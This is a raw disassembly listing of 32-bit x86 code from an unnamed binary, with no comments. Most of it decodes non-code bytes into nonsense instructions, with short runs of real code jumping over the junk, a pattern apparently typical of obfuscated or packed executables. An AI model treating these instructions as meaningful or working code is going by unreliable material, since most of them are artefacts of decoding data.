  412555:	mov    eax,DWORD PTR [ebp-0x10]
  412558:	mov    DWORD PTR [ebp-0x8],ecx
  41255b:	pop    ecx
  41255c:	div    ecx
  41255e:	mov    ecx,eax
  412560:	mov    eax,ds:0x422584
  412565:	or     ecx,ebx
  412567:	sub    ecx,edi
  412569:	or     ecx,eax
  41256b:	mov    eax,DWORD PTR [ebp-0x4]
  41256e:	sub    eax,ecx
  412570:	mov    ecx,DWORD PTR [ebp-0x14]
  412573:	jmp    0x412871
  412578:	adc    eax,esp
  41257a:	inc    edx
  41257b:	xor    DWORD PTR [edx+0x1d7911a9],0xffffffc3
  412582:	imul   esi,DWORD PTR [ecx-0x43],0xffffff9b
  412586:	popf   
  412587:	outs   dx,DWORD PTR ds:[esi]
  412588:	sub    BYTE PTR [edi-0x45],0xbb
  41258c:	jns    0x41254d
  41258e:	mov    ebx,0x317460bb
  412593:	pop    ecx
  412594:	adc    al,BYTE PTR [edx]
  412596:	sbb    DWORD PTR [edx+0x7219ff3c],edx
  41259c:	fistp  QWORD PTR [esi+0x59]
  41259f:	clc    
  4125a0:	mov    al,0x1f
  4125a2:	push   ebx
  4125a3:	jge    0x4125e4
  4125a5:	jnp    0x412602
  4125a7:	lea    edi,[edi+0x1f]
  4125aa:	out    dx,eax
  4125ab:	xchg   ecx,eax
  4125ac:	cmc    
  4125ad:	bound  edx,QWORD PTR [edi]
  4125af:	(bad)  
  4125b0:	mov    al,0xa
  4125b2:	jb     0x412629
  4125b4:	inc    eax
  4125b5:	jmp    0x17bb:0xd9ffffa6
  4125bc:	fistp  WORD PTR [esi-0x26ef53a9]
  4125c2:	jge    0x412609
  4125c4:	pop    ds
  4125c5:	jmp    0xeb9:0x1af66dd6
  4125cc:	jae    0x412561
  4125ce:	push   esi
  4125cf:	imul   ebp,edx,0x20926391
  4125d5:	(bad)  
  4125d6:	aad    0x1f
  4125d8:	mov    cl,dh
  4125da:	inc    esp
  4125db:	icebp  
  4125dc:	xlat   BYTE PTR ds:[ebx]
  4125dd:	mov    al,0x7b
  4125df:	cmp    al,0xaa
  4125e1:	push   ebx
  4125e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125e3:	sar    esi,1
  4125e5:	mov    eax,0x98e56c1f
  4125ea:	push   edx
  4125eb:	sbb    eax,0xc7c662ff
  4125f0:	adc    bh,BYTE PTR [esi-0x179a86e9]
  4125f6:	scas   al,BYTE PTR es:[edi]
  4125f7:	cmp    edi,0x69
  4125fa:	mov    esp,0x2ebfc98e
  4125ff:	std    
  412600:	cli    
  412601:	sub    BYTE PTR [ecx+0x23],0x46
  412605:	js     0x41264f
  412607:	dec    edx
  412608:	sti    
  412609:	mov    eax,0x4cc95d5e
  41260e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41260f:	mov    BYTE PTR [ebx],dl
  412611:	push   cs
  412612:	out    dx,al
  412613:	cmp    edi,DWORD PTR [ebx]
  412615:	mov    bl,0xd1
  412617:	aad    0xd1
  412619:	cmp    edx,DWORD PTR [edi]
  41261b:	mov    cs,WORD PTR [ebp-0x73f38299]
  412621:	mov    eax,ds:0xa502a925
  412626:	arpl   dx,ax
  412628:	mov    edx,0xfc5eeea
  41262d:	jecxz  0x412675
  41262f:	push   ss
  412630:	xor    BYTE PTR [esi-0x4f8ac0b6],0x20
  412637:	bound  edx,QWORD PTR [edx+0x159f2cf0]
  41263d:	or     ebp,DWORD PTR [ebx+edi*2-0x536c134]
  412644:	test   al,0xe3
  412646:	add    eax,0x275f20e0
  41264b:	sbb    dl,ah
  41264d:	shr    DWORD PTR [ebx+0xd],1
  412650:	or     edx,edx
  412652:	js     0x412637
  412654:	and    esi,eax
  412656:	pop    edx
  412657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412658:	lds    esp,FWORD PTR [ecx+ebx*8-0x368550ba]
  41265f:	push   esi
  412660:	mov    eax,ds:0xd5772b50
  412665:	dec    edi
  412666:	xor    eax,DWORD PTR [eax]
  412668:	sub    DWORD PTR [ebp+0x69],edx
  41266b:	inc    eax
  41266c:	or     edi,DWORD PTR [edi+0xe94e4ee]
  412672:	fdiv   QWORD PTR [edx-0x10]
  412675:	cmp    al,0xd4
  412677:	and    esi,DWORD PTR [edx-0x4d]
  41267a:	xor    cl,BYTE PTR [edx-0x6b]
  41267d:	dec    ecx
  41267e:	sbb    eax,DWORD PTR [esi]
  412680:	out    dx,al
  412681:	daa    
  412682:	jno    0x41266c
  412684:	(bad)
  412687:	or     al,0x9b
  412689:	das    
  41268a:	inc    esi
  41268b:	dec    edi
  41268c:	pop    eax
  41268d:	sti    
  41268e:	int3   
  41268f:	xor    al,0xdf
  412691:	jp     0x412688
  412693:	test   DWORD PTR [eax+esi*8],ebp
  412696:	dec    ebx
  412697:	cmp    eax,0x63d15287
  41269c:	enter  0xd4d5,0xa8
  4126a0:	fnstenv [edi+0x64878f52]
  4126a6:	retf   0x8799
  4126a9:	xchg   ecx,eax
  4126aa:	and    edx,ebx
  4126ac:	clc    
  4126ad:	jl     0x412667
  4126af:	cmp    eax,0x42f1e8cb
  4126b4:	or     DWORD PTR [eax],ebx
  4126b6:	call   DWORD PTR [edx-0x6b985372]
  4126bc:	sub    al,0x1e
  4126be:	add    eax,0x1b32ed44
  4126c3:	into   
  4126c4:	mov    esp,0x787146a6
  4126c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126ca:	icebp  
  4126cb:	lea    esi,[esi-0x6df8a009]
  4126d1:	cli    
  4126d2:	push   eax
  4126d3:	call   DWORD PTR [ecx-0x6d]
  4126d6:	xor    eax,0x1275f8e1
  4126db:	adc    al,0xb1
  4126dd:	pop    esi
  4126de:	(bad)  
  4126df:	sub    cl,BYTE PTR [eax+0x65]
  4126e2:	fwait
  4126e3:	aaa    
  4126e4:	out    dx,al
  4126e5:	out    dx,al
  4126e6:	arpl   WORD PTR [eax-0x331c99e2],cx
  4126ec:	push   0x4bcaf4b9
  4126f1:	test   eax,0xdfb336ae
  4126f6:	je     0x41273e
  4126f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126f9:	arpl   WORD PTR [eax+0x6a],bp
  4126fc:	sbb    esi,DWORD PTR [ebx]
  4126fe:	adc    ebx,DWORD PTR [ecx+eiz*4+0x1b]
  412702:	and    al,BYTE PTR [edx+0x1fdac75e]
  412708:	sub    BYTE PTR ds:0x20f7f12d,dl
  41270e:	lds    edi,FWORD PTR [edi-0x3bbd025e]
  412714:	pushf  
  412715:	mov    al,ds:0x83f00602
  41271a:	out    dx,al
  41271b:	xor    DWORD PTR [ebx+0x39],esi
  41271e:	ret    
  41271f:	lock je 0x41276e
  412722:	rcr    DWORD PTR [ebp-0x7e],0x39
  412726:	xchg   BYTE PTR [ecx-0x103bb7d8],dl
  41272c:	cmp    al,0x6
  41272e:	rcl    bl,1
  412730:	cmp    eax,0xc1948851
  412735:	imul   eax,DWORD PTR [ebx-0x48],0xffffffff
  412739:	popf   
  41273a:	test   ebx,0x30243ec4
  412740:	sbb    BYTE PTR [ecx-0x43e8bca2],bh
  412746:	(bad)  
  412747:	dec    edi
  412748:	call   0xf789742f
  41274d:	frstor [ebx+edx*1]
  412750:	mov    al,0x41
  412752:	mov    ds:0xb36094f7,eax
  412757:	enter  0x3093,0x9d
  41275b:	cdq    
  41275c:	loope  0x412787
  41275e:	popa   
  41275f:	mov    cl,0x73
  412761:	and    eax,0xbff9484b
  412766:	mov    DWORD PTR [eax],esi
  412768:	mov    ebx,0x4588cf47
  41276d:	cmp    BYTE PTR [esp+esi*8-0x3703f27e],ah
  412774:	jge    0x4127dd
  412776:	pushf  
  412777:	leave  
  412778:	int3   
  412779:	retf   
  41277a:	lahf   
  41277b:	inc    edi
  41277c:	push   ss
  41277d:	test   BYTE PTR gs:[ebp+0x59],ah
  412781:	int    0x60
  412783:	out    0x30,al
  412785:	mov    cl,0xab
  412787:	inc    esp
  412788:	jge    0x4127db
  41278a:	js     0x412809
  41278c:	test   eax,0xa578ed88
  412791:	enter  0xd9a4,0x4f
  412795:	(bad)  
  412797:	int3   
  412798:	fsubr  QWORD PTR [edi-0x4b]
  41279b:	(bad)  
  41279c:	push   0x2a1af8a3
  4127a1:	sub    al,0x65
  4127a3:	psllw  mm1,mm4
  4127a6:	aas    
  4127a7:	xchg   WORD PTR [edi-0x57],dx
  4127ab:	mov    ebx,0x1f3adaa
  4127b0:	rcr    BYTE PTR [ebp+0x59d30aaf],0x5b
  4127b7:	push   edx
  4127b8:	out    0xb0,eax
  4127ba:	mov    edx,0xe6be03b0
  4127bf:	push   cs
  4127c0:	or     bl,BYTE PTR [esi]
  4127c2:	mov    ebp,0x3718627c
  4127c7:	arpl   di,cx
  4127c9:	std    
  4127ca:	xor    DWORD PTR [edi-0x19],ecx
  4127cd:	mov    ebp,0x5bab8716
  4127d2:	fisttp WORD PTR [eax+ebx*1+0x4e]
  4127d6:	push   edx
  4127d7:	fidiv  WORD PTR [ecx]
  4127d9:	iret   
  4127da:	es jnp 0x41278d
  4127dd:	and    edx,edx
  4127df:	dec    esi
  4127e0:	jecxz  0x41282a
  4127e2:	sbb    al,cl
  4127e4:	cmp    DWORD PTR [esi+0x6d],eax
  4127e7:	cmp    eax,0x4bc0b271
  4127ec:	inc    ecx
  4127ed:	lods   eax,DWORD PTR ds:[esi]
  4127ee:	or     ebx,DWORD PTR [esi+ebx*2-0x25662c0f]
  4127f5:	dec    esi
  4127f6:	cmp    BYTE PTR [ebx-0x74],ch
  4127f9:	sbb    al,0xe8
  4127fb:	ins    BYTE PTR es:[edi],dx
  4127fc:	fwait
  4127fd:	dec    ebx
  4127fe:	push   eax
  4127ff:	mov    dl,0x30
  412801:	jp     0x41284b
  412803:	sbb    al,0x6f
  412805:	ins    DWORD PTR es:[edi],dx
  412806:	ret    0x17d0
  412809:	(bad)  [esi+eiz*8+0x22]
  41280d:	mov    ebx,DWORD PTR gs:[ebx+0x6bb27ba5]
  412814:	dec    ecx
  412815:	xchg   ebp,eax
  412816:	ret    0xcf60
  412819:	push   ebp
  41281a:	dec    BYTE PTR [ebp+esi*2+0x1389809d]
  412821:	push   ds
  412822:	mov    cl,0x93
  412824:	pop    ss
  412825:	adc    eax,0x668c84c7
  41282a:	outs   dx,BYTE PTR ds:[esi]
  41282b:	es dec ecx
  41282d:	fsubr  QWORD PTR [esi-0x16]
  412830:	test   eax,0x730b490c
  412835:	add    edx,DWORD PTR ds:0x6c9cbbf1
  41283b:	nop
  41283c:	outs   dx,BYTE PTR ds:[esi]
  41283d:	mov    al,ds:0xcbd9259f
  412842:	dec    ebx
  412843:	add    eax,0x9f75396c
  412848:	mov    BYTE PTR [edx],ah
  41284a:	jno    0xe75c4b09
  412850:	pop    ss
  412851:	cmp    eax,0x1ef9071b
  412856:	popf   
  412857:	xor    eax,0x699ab3e4
  41285c:	mov    ecx,0xa110992
  412861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412862:	dec    ebp
  412863:	popf   
  412864:	add    BYTE PTR [ecx+0x15a8f023],dh
  41286a:	ins    BYTE PTR es:[edi],dx
  41286b:	inc    ebx
  41286c:	push   ds
  41286d:	add    dh,BYTE PTR [ebp-0x3ed42f1f]
  412873:	jmp    0x412b71
  412878:	xlat   BYTE PTR ds:[ebx]
  412879:	out    dx,eax
  41287a:	jae    0x4128aa
  41287c:	jae    0x412834
  41287e:	xchg   edi,eax
  41287f:	aaa    
  412880:	xor    al,0x78
  412882:	imul   esi,DWORD PTR [ecx-0x42],0xffffffbe
  412886:	les    edi,FWORD PTR [ebx]
  412888:	inc    eax
  412889:	jns    0x412846
  41288b:	mov    ebx,0xbbbbbf79
  412890:	or     esi,ebx
  412892:	retf   
  412893:	add    ebx,DWORD PTR [ebx+0x2c]
  412896:	cmp    eax,0x451723e5
  41289b:	push   ebp
  41289c:	loop   0x4128e5
  41289e:	add    esp,DWORD PTR [esi-0x29fe6b01]
  4128a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128a5:	or     al,0x75
  4128a7:	sub    al,0x43
  4128a9:	outs   dx,BYTE PTR ds:[esi]
  4128aa:	stos   BYTE PTR es:[edi],al
  4128ab:	retf   0x35c3
  4128ae:	sub    eax,0xa8bdb3be
  4128b3:	and    bl,dl
  4128b5:	push   edx
  4128b6:	je     0x412844
  4128b8:	mov    ah,0xa4
  4128ba:	cmp    bh,dh
  4128bc:	test   BYTE PTR [ebx+0x8],bh
  4128bf:	(bad)  
  4128c0:	nop
  4128c1:	sub    eax,0x826dc291
  4128c6:	mov    ebx,0x702da1a5
  4128cb:	pop    ebx
  4128cc:	js     0x41289e
  4128ce:	jb     0x4128a7
  4128d0:	jae    0x41285b
  4128d2:	xchg   ebp,eax
  4128d3:	xor    DWORD PTR [esi],eax
  4128d5:	arpl   WORD PTR [edx-0xb],ax
  4128d8:	scas   al,BYTE PTR es:[edi]
  4128d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128da:	fild   QWORD PTR [ecx]
  4128dc:	mov    bh,0x9a
  4128de:	outs   dx,DWORD PTR ds:[esi]
  4128df:	lods   eax,DWORD PTR ds:[esi]
  4128e0:	jl     0x412912
  4128e2:	loopne 0x41294a
  4128e4:	jecxz  0x412912
  4128e6:	enter  0x4e52,0x54
  4128ea:	and    eax,0xa31d79dd
  4128ef:	jbe    0x412926
  4128f1:	and    DWORD PTR [edi+edi*4+0x7ea88c13],esp
  4128f8:	push   ebp
  4128f9:	or     eax,0x98bcb1fd
  4128fe:	sbb    DWORD PTR [edi],ebx
  412900:	and    eax,esp
  412902:	and    eax,eax
  412904:	rcl    DWORD PTR [edx+0x17abe51f],cl
  41290a:	call   0xa01db45c
  41290f:	out    dx,al
  412910:	pop    ss
  412911:	xor    al,0xac
  412913:	dec    ebx
  412914:	mov    ds:0xccfa3c55,al
  412919:	adc    al,0x19
  41291b:	cs sbb eax,0xa35171f9
  412921:	xchg   ebx,eax
  412922:	out    0xa3,al
  412924:	int3   
  412925:	fadd   DWORD PTR [esi+0x0]
  412928:	push   0x3b17fae5
  41292d:	jns    0x41290e
  41292f:	jg     0x4128cb
  412931:	mov    cl,0xb3
  412933:	and    eax,ebx
  412935:	mov    esi,0x366cbebe
  41293a:	out    0x89,eax
  41293c:	mov    al,ds:0xccbe93a4
  412941:	fwait
  412942:	loopne 0x41299b
  412944:	mov    edi,0x6e5f5b9f
  412949:	pop    es
  41294a:	sub    DWORD PTR [ebx+eiz*1-0x35],eax
  41294e:	dec    ebp
  41294f:	adc    dl,BYTE PTR [edx]
  412951:	hlt    
  412952:	inc    esi
  412953:	ja     0x4128e6
  412955:	outs   dx,BYTE PTR ds:[esi]
  412956:	(bad)  
  412957:	aam    0xd5
  412959:	jmp    0xce51:0x1ac28ef7
  412960:	clc    
  412961:	sub    DWORD PTR [ebp+0x44543ef4],ebp
  412967:	jbe    0x41296d
  412969:	lock xchg edx,eax
  41296b:	jbe    0x41290b
  41296d:	pop    eax
  41296e:	nop
  41296f:	pusha  
  412970:	xchg   ebp,eax
  412971:	sbb    DWORD PTR [ebp+0x492e1fc0],edi
  412977:	imul   edi,esp,0xfffffff3
  41297a:	mov    ch,ah
  41297c:	cwde   
  41297d:	call   0x5a3901b4
  412982:	mov    ah,0x40
  412984:	lods   al,BYTE PTR ds:[esi]
  412985:	or     BYTE PTR [ebx],ch
  412987:	pop    ss
  412988:	scas   al,BYTE PTR es:[edi]
  412989:	dec    edi
  41298a:	xlat   BYTE PTR ds:[bx]
  41298c:	mov    ebp,DWORD PTR [eax-0x29]
  41298f:	in     eax,dx
  412990:	add    cl,0x7
  412993:	xchg   BYTE PTR [ecx+edx*2],ah
  412996:	cmp    eax,0x6d5aa5f9
  41299b:	push   es
  41299c:	out    0x81,eax
  41299e:	dec    DWORD PTR [ebp-0xc]
  4129a1:	shl    DWORD PTR [ecx-0x6c780bef],0x50
  4129a8:	and    bl,BYTE PTR [eax+0x14565f3d]
  4129ae:	fisubr WORD PTR [edi+edi*8]
  4129b1:	pop    ebx
  4129b2:	out    0x9c,eax
  4129b4:	mov    esp,0x7afa8d11
  4129b9:	sar    al,1
  4129bb:	mov    ecx,0x624821ca
  4129c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129c1:	test   cl,cl
  4129c3:	loope  0x412950
  4129c5:	mov    ah,0xfe
  4129c7:	pop    eax
  4129c8:	rol    BYTE PTR [ecx-0x595c5640],1
  4129ce:	push   ecx
  4129cf:	cmp    eax,0x3e9f7449
  4129d4:	fstp   TBYTE PTR [ebp+0x14602898]
  4129da:	enter  0xda67,0x6b
  4129de:	pop    ds
  4129df:	jo     0x412a51
  4129e1:	jno    0x412a5b
  4129e3:	jb     0x412a4d
  4129e5:	(bad)  
  4129e6:	test   BYTE PTR [eax],0x50
  4129e9:	popa   
  4129ea:	sbb    esp,DWORD PTR [edx]
  4129ec:	xor    eax,0xe66294fd
  4129f1:	adc    al,al
  4129f3:	test   al,0xa5
  4129f5:	shr    BYTE PTR [eax],cl
  4129f7:	das    
  4129f8:	or     BYTE PTR [ecx-0x67],dl
  4129fb:	lods   eax,DWORD PTR ds:[esi]
  4129fc:	ja     0x4129f9
  4129fe:	xlat   BYTE PTR ds:[ebx]
  4129ff:	add    ah,BYTE PTR [edi-0x4e3b88e1]
  412a05:	cmp    eax,0xee3e75f3
  412a0a:	push   0xb3a723fb
  412a0f:	add    DWORD PTR [bx+si],eax
  412a12:	add    al,BYTE PTR [edx+0x6f]
  412a15:	ds stos BYTE PTR es:[edi],al
  412a17:	mul    DWORD PTR [ebx+0x78]
  412a1a:	sub    bl,BYTE PTR [esi+ecx*2+0x11]
  412a1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a1f:	out    0x2d,al
  412a21:	arpl   si,si
  412a23:	add    ah,bh
  412a25:	inc    edx
  412a26:	mov    WORD PTR [ecx+eiz*1],cs
  412a29:	test   eax,0x17c39925
  412a2e:	int    0xbe
  412a30:	popa   
  412a31:	jo     0x4129fd
  412a33:	mov    ch,0x16
  412a35:	jp     0x4129e8
  412a37:	arpl   WORD PTR [esp+eiz*4+0xd2e876],bx
  412a3e:	mov    al,0xd6
  412a40:	test   DWORD PTR [edx-0x1ae053c5],ecx
  412a46:	xchg   ecx,eax
  412a47:	inc    ecx
  412a48:	add    ch,BYTE PTR [eiz*4-0x5897b7e8]
  412a4f:	push   0xffffffab
  412a51:	add    dl,bh
  412a53:	movsx  ebp,ah
  412a56:	cwde   
  412a57:	dec    ebp
  412a58:	xor    edx,edi
  412a5a:	jg     0x412a5c
  412a5c:	or     dl,0x3d
  412a5f:	loop   0x412aa5
  412a61:	sbb    ecx,DWORD PTR [esi-0x24]
  412a64:	(bad)  
  412a65:	bnd jl 0x412a59
  412a68:	inc    edi
  412a69:	enter  0x9ebb,0x65
  412a6d:	hlt    
  412a6e:	je     0x412a83
  412a70:	lds    esp,FWORD PTR [ebx+0x5b6c8db0]
  412a76:	mov    edx,0x5ff2ae42
  412a7b:	or     cl,dh
  412a7d:	adc    ah,BYTE PTR [ecx-0x2f9d2576]
  412a83:	test   DWORD PTR [eax+0x42],esp
  412a86:	fist   DWORD PTR [esi]
  412a88:	sahf   
  412a89:	adc    al,0x56
  412a8b:	push   0xfffffffe
  412a8d:	ja     0x412a29
  412a8f:	xor    al,BYTE PTR [ebp+ebp*8+0x8]
  412a93:	lock xor BYTE PTR [ebx],dh
  412a96:	mov    esi,0x9f046e92
  412a9b:	or     BYTE PTR [esi-0x52db4e43],bh
  412aa1:	push   edx
  412aa2:	test   eax,0x7cd94188
  412aa7:	sbb    cl,BYTE PTR [ecx]
  412aa9:	xor    esi,DWORD PTR [esi+0x28]
  412aac:	ds pop edx
  412aae:	ins    BYTE PTR es:[edi],dx
  412aaf:	jle    0x412a3d
  412ab1:	pop    esi
  412ab3:	inc    eax
  412ab4:	call   0xfd2:0x7020f47e
  412abb:	sub    ebp,DWORD PTR [edi-0x4c]
  412abe:	xor    bl,dh
  412ac0:	add    BYTE PTR [ecx-0x30],bh
  412ac3:	and    cl,BYTE PTR [ebp*8+0x72bf116a]
  412aca:	and    bl,BYTE PTR [edx+edx*4-0x50be2ed2]
  412ad1:	daa    
  412ad2:	(bad)  
  412ad3:	jbe    0x412aa2
  412ad5:	xor    DWORD PTR [eax-0x68ac7363],esp
  412adb:	sbb    dl,BYTE PTR [ebp-0x5581f03c]
  412ae1:	push   0x7f0dfeec
  412ae6:	popa   
  412ae7:	pop    ss
  412ae8:	cmp    al,0xe7
  412aea:	adc    ebp,DWORD PTR [ecx]
  412aec:	jne    0x412aa5
  412aee:	sbb    dl,dl
  412af0:	push   eax
  412af1:	and    DWORD PTR [esi+ebp*8],edi
  412af4:	push   ebx
  412af5:	dec    edx
  412af6:	ds xchg esp,eax
  412af8:	shl    DWORD PTR ds:0x86306b23,cl
  412afe:	js     0x412b74
  412b00:	dec    ebx
  412b01:	pop    esp
  412b02:	mov    al,ds:0x1d1e7204
  412b07:	mov    bl,0x29
  412b09:	push   cs
  412b0a:	shl    DWORD PTR ss:[edi+ebp*2],0x16
  412b0f:	scas   eax,DWORD PTR es:[edi]
  412b10:	call   0xf2b53725
  412b15:	(bad)  
  412b16:	clc    
  412b17:	repz fild DWORD PTR [ecx]
  412b1a:	call   0xdad60b32
  412b1f:	or     BYTE PTR [ecx+0x77],0x87
  412b23:	enter  0xa714,0xe7
  412b27:	jmp    0x412b8a
  412b29:	fs adc eax,0xbc457b5b
  412b2f:	(bad)  
  412b30:	push   ecx
  412b31:	jno    0x412abb
  412b33:	add    al,0x94
  412b35:	or     eax,0x3ce74490
  412b3a:	pmaxub mm3,QWORD PTR [edi+0x1f86d719]
  412b41:	dec    ecx
  412b42:	mov    DWORD PTR [ecx+ecx*4],ebp
  412b45:	xchg   BYTE PTR [eax-0x66864989],al
  412b4b:	sbb    dh,bl
  412b4d:	arpl   WORD PTR [ecx+0x269ac1ce],di
  412b53:	push   ds
  412b54:	bound  ebx,QWORD PTR [edi+0x47]
  412b57:	dec    eax
  412b58:	clc    
  412b59:	rcl    ecx,cl
  412b5b:	bts    DWORD PTR [eax+0x3d],ebp
  412b5f:	xchg   esp,eax
  412b60:	cmp    edi,DWORD PTR [eax]
  412b62:	scas   eax,DWORD PTR es:[edi]
  412b63:	mov    esp,DWORD PTR [ebp+0x3a89144a]
  412b69:	adc    eax,edx
  412b6b:	aad    0x2c
  412b6d:	ret    
  412b6e:	int    0x53
  412b70:	retf   
  412b71:	sub    eax,esi
  412b73:	cmp    eax,DWORD PTR [ebp-0x8]
  412b76:	jmp    0x412e74
  412b7b:	out    dx,eax
  412b7c:	cmp    al,0xe
  412b7e:	ficomp DWORD PTR ds:0x213c2fe8
  412b84:	push   ss
  412b85:	mov    esi,0xf9fa403b
  412b8a:	das    
  412b8b:	idiv   BYTE PTR [ebx-0x45]
  412b8e:	mov    ebx,0xbbbbbf79
  412b93:	or     esi,eax
  412b95:	sahf   
  412b96:	push   edx
  412b97:	repnz pop ds
  412b99:	scas   eax,DWORD PTR es:[edi]
  412b9a:	in     al,dx
  412b9b:	(bad)  
  412b9c:	jno    0x412bf8
  412b9e:	inc    ebx
  412b9f:	push   ds
  412ba0:	aam    0x63
  412ba2:	ror    ebx,0x5a
  412ba5:	fbstp  TBYTE PTR [esi+edi*2+0x6e307806]
  412bac:	sub    DWORD PTR [esi+0x75],0xffffffb8
  412bb0:	mov    fs,WORD PTR [edx]
  412bb2:	xor    BYTE PTR [eax+ebp*1+0x46526620],0x24
  412bba:	jnp    0x412bbf
  412bbc:	xor    ecx,esp
  412bbe:	gs hlt 
  412bc0:	inc    esp
  412bc1:	inc    ebx
  412bc2:	xor    DWORD PTR [ecx],eax
  412bc4:	push   eax
  412bc5:	fist   WORD PTR [ecx+0x4b914f28]
  412bcb:	into   
  412bcc:	cld    
  412bcd:	sub    bh,BYTE PTR [esi]
  412bcf:	fnstsw WORD PTR [edx-0x33692f3]
  412bd5:	mov    bh,0xc4
  412bd7:	xor    BYTE PTR [edx+ebx*8-0x39],dl
  412bdb:	pushf  
  412bdc:	fist   WORD PTR [esi]
  412bde:	mov    edx,0x90196bab
  412be3:	dec    edi
  412be4:	sahf   
  412be5:	out    0x85,eax
  412be7:	dec    ecx
  412be8:	test   BYTE PTR [edi-0x87dfb5d],bh
  412bee:	(bad)  
  412bef:	or     bl,BYTE PTR [ecx]
  412bf1:	in     al,dx
  412bf2:	push   ebp
  412bf3:	adc    al,0x81
  412bf5:	icebp  
  412bf6:	inc    ebp
  412bf7:	imul   eax,DWORD PTR [ebx+0x42],0xffffffd9
  412bfb:	aad    0x6b
  412bfd:	mov    ecx,0xbd250b2
  412c02:	or     DWORD PTR [esi+eiz*1-0x7a],ecx
  412c06:	mov    ecx,0xb78b9d46
  412c0b:	pop    ebp
  412c0c:	outs   dx,DWORD PTR ds:[esi]
  412c0d:	fs pop ebp
  412c0f:	leave  
  412c10:	int3   
  412c11:	inc    edx
  412c12:	mov    eax,0x9747057d
  412c17:	or     al,0xd1
  412c19:	scas   al,BYTE PTR es:[edi]
  412c1a:	pop    edi
  412c1b:	loopne 0x412ba8
  412c1d:	(bad)  
  412c1e:	out    0x5e,eax
  412c20:	sub    dh,BYTE PTR [eax]
  412c22:	push   edx
  412c23:	in     al,0xc3
  412c25:	jge    0x412bea
  412c27:	fcom   st(3)
  412c29:	push   ss
  412c2a:	inc    edi
  412c2b:	aas    
  412c2c:	lods   al,BYTE PTR ds:[esi]
  412c2d:	mov    al,ds:0xac481c1b
  412c32:	sbb    BYTE PTR [esp+eax*1+0x8],bh
  412c36:	loopne 0x412cb6
  412c38:	ins    BYTE PTR es:[edi],dx
  412c39:	push   ebp
  412c3a:	jns    0x412c7b
  412c3c:	sti    
  412c3d:	add    al,dh
  412c3f:	pop    ss
  412c40:	mov    BYTE PTR [ebx+eiz*8-0x76efc095],ah
  412c47:	adc    eax,0x43dd3988
  412c4c:	jp     0x412c25
  412c4e:	sbb    ah,cl
  412c50:	fwait
  412c51:	sub    DWORD PTR ds:0x529cfd70,edi
  412c57:	pop    ds
  412c58:	(bad)  
  412c59:	fs (bad) 
  412c5b:	mov    dl,0xd
  412c5d:	not    BYTE PTR [esi]
  412c5f:	movlhps xmm5,xmm7
  412c62:	pop    ds
  412c63:	and    DWORD PTR [esi],eax
  412c65:	or     eax,edi
  412c67:	cdq    
  412c68:	jge    0x412cc1
  412c6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c6b:	sub    DWORD PTR [esi+0x15],ebp
  412c6e:	and    BYTE PTR [ecx-0x30],dh
  412c71:	ret    
  412c72:	shr    BYTE PTR ds:0xbd620ac6,0x9
  412c79:	in     eax,0x60
  412c7b:	and    BYTE PTR [edx+0x4c],cl
  412c7e:	xchg   esi,eax
  412c7f:	pop    ds
  412c80:	sbb    dh,BYTE PTR [edi+0x20]
  412c83:	jmp    0x412c25
  412c85:	push   ecx
  412c86:	inc    eax
  412c87:	fsubr  QWORD PTR [edi-0x317463e5]
  412c8d:	xchg   edi,eax
  412c8e:	push   ss
  412c8f:	xor    bl,0xe7
  412c92:	imul   edi,DWORD PTR [edx+0x6e],0x266e1bb1
  412c99:	or     al,0x1
  412c9b:	add    BYTE PTR [edx-0x60939891],cl
  412ca1:	test   DWORD PTR [eax-0x33e3c46f],ebx
  412ca7:	adc    BYTE PTR [ebx],cl
  412ca9:	ja     0x412c56
  412cab:	inc    edi
  412cac:	sti    
  412cad:	aad    0x6f
  412caf:	(bad)  
  412cb0:	repnz lods al,BYTE PTR ds:[esi]
  412cb2:	dec    eax
  412cb3:	bound  esi,QWORD PTR [esi-0x72]
  412cb6:	hlt    
  412cb7:	pop    esp
  412cb8:	cld    
  412cb9:	or     eax,DWORD PTR [ebp+0x44]
  412cbc:	scas   al,BYTE PTR es:[edi]
  412cbd:	jl     0x412d05
  412cbf:	cmp    ebx,DWORD PTR [ebx-0x45]
  412cc2:	adc    BYTE PTR ds:0x3372de65,ah
  412cc8:	popa   
  412cc9:	push   esp
  412cca:	pop    ebx
  412ccb:	mov    WORD PTR [edx-0x3b],gs
  412cce:	jg     0x412c78
  412cd0:	xchg   ecx,eax
  412cd1:	fist   DWORD PTR [ecx+0x56]
  412cd4:	jecxz  0x412ccd
  412cd6:	leave  
  412cd7:	sbb    DWORD PTR [edi],ebp
  412cd9:	aam    0x76
  412cdb:	cmp    eax,0xba5bb6c8
  412ce0:	test   al,0x3a
  412ce2:	pusha  
  412ce3:	pop    ds
  412ce4:	mov    al,BYTE PTR [ecx]
  412ce6:	test   BYTE PTR [edi+0x49],0xd9
  412cea:	popf   
  412ceb:	inc    esi
  412cec:	jbe    0x412d30
  412cee:	inc    esp
  412cef:	int    0xd0
  412cf1:	inc    esi
  412cf2:	adc    BYTE PTR [edi+edi*1+0x77],ch
  412cf6:	jg     0x412c95
  412cf8:	lea    ecx,[ecx+0xd145777]
  412cfe:	mov    ds:0x8b7a9a64,eax
  412d03:	dec    ebp
  412d04:	sub    DWORD PTR [edi],ebp
  412d06:	imul   edx,DWORD PTR [eax+eiz*8-0x2b50fc14],0x30
  412d0e:	rol    DWORD PTR [ecx+0x3fd8c97d],1
  412d14:	ret    0x3d07
  412d17:	cmp    al,0x21
  412d19:	xchg   esi,eax
  412d1a:	add    bh,bl
  412d1c:	sbb    ebp,DWORD PTR [edx]
  412d1e:	scas   eax,DWORD PTR es:[edi]
  412d1f:	or     BYTE PTR [edi],cl
  412d21:	idiv   ch
  412d23:	sub    DWORD PTR [edi+0x691af422],0xc4fdc409
  412d2d:	shl    BYTE PTR [edi],cl
  412d2f:	div    DWORD PTR [ebx-0x67087809]
